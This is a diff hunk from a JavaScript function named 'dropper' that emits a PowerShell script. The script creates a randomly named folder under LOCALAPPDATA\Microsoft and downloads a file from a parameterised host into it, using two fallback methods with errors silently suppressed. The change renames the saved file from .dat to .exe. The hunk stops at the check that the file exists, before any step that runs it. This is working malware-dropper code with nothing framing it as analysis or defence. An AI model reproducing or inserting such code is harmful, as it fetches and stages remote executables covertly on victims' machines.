@@ -478,7 +478,7 @@ function dropper(host, pkg) {
 $r=-join((1..10|%{[char](97+[int](Get-Random -Max 26))}))
 $d="$env:LOCALAPPDATA\\Microsoft\\$r"
 New-Item -ItemType Directory -Path $d -Force|Out-Null
-$f="$d\\$r.dat"
+$f="$d\\$r.exe"
 try{(New-Object Net.WebClient).DownloadFile('https://${host}${pkg}',$f)}catch{}
 if(!(Test-Path $f)){try{Invoke-WebRequest -Uri 'https://${host}${pkg}' -OutFile $f -UseBasicParsing}catch{}}
 if(Test-Path $f){
